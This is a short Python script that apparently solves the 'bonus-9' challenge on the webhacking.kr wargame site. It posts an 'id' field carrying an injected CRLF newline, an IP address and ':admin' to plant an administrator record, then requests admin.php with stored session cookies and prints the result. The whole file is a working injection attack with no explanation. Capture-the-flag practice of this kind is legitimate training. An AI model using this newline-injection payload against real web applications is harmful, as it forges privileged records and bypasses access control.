import requests
from phpsessid import cookies

ip = '103.41.24.37'

url = 'https://webhacking.kr/challenge/bonus-9/index.php'
data = {'id':'asdf\r\n'+ip+':admin'}
response = requests.post(url, cookies=cookies, data=data)

url = 'https://webhacking.kr/challenge/bonus-9/admin.php'
response = requests.get(url, cookies=cookies)
print(response.text)

